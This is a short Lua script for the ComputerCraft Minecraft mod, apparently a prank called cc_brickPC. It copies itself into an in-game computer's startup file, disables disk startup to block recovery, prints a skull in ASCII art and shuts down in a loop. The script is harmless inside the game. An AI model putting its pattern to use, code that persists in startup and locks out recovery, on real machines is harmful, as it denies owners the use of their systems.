-- cc_brickPC
-- chrimsbrew

shell.run("cp /disk/startup.lua /startup.lua") -- copy full contents to a computer's startup folder
settings.set("shell.allow_disk_startup", false) -- change the startup settings to prevent recovering from a brick with another disk
settings.save(".settings") -- save changes to a .settings file which is called after startup
print([[
       .ed"""" """$$$$be.
     -"           ^""**$$$e.
   ."                   '$$$c
  /                      "4$$b
 d  3                      $$$$
 $  *                   .$$$$$$
.$  ^c           $$$$$e$$$$$$$$.
d$L  4.         4$$$$$$$$$$$$$$b
$$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
$$$$P d$$$$F $ $$$$$$$$$- $$$$$$
3$$$F "$$$$b   $"$$$$$$$  $$$$*"
 $$P"  "$$b   .$ $$$$$...e$$
  *c    ..    $$ 3$$$$$$$$$$eF
    %ce""    $$$  $$$$$$$$$$*
     *$e.    *** d$$$$$"L$$
      $$$      4J$$$$$% $$$
     $"'$=e....$*$$**$cz$$"
     $  *=%4.$ L L$ P3$$$F
     $   "%*ebJLzb$e$$$$$b
      %..      4$$$$$$$$$$
       $$$e   z$$$$$$$$$$
        "*$c  "$$$$$$$P"
          """*$$$$$$$"
]])
shell.run("startup") -- run this program (after loading onto a computer)
os.sleep(1)
os.shutdown()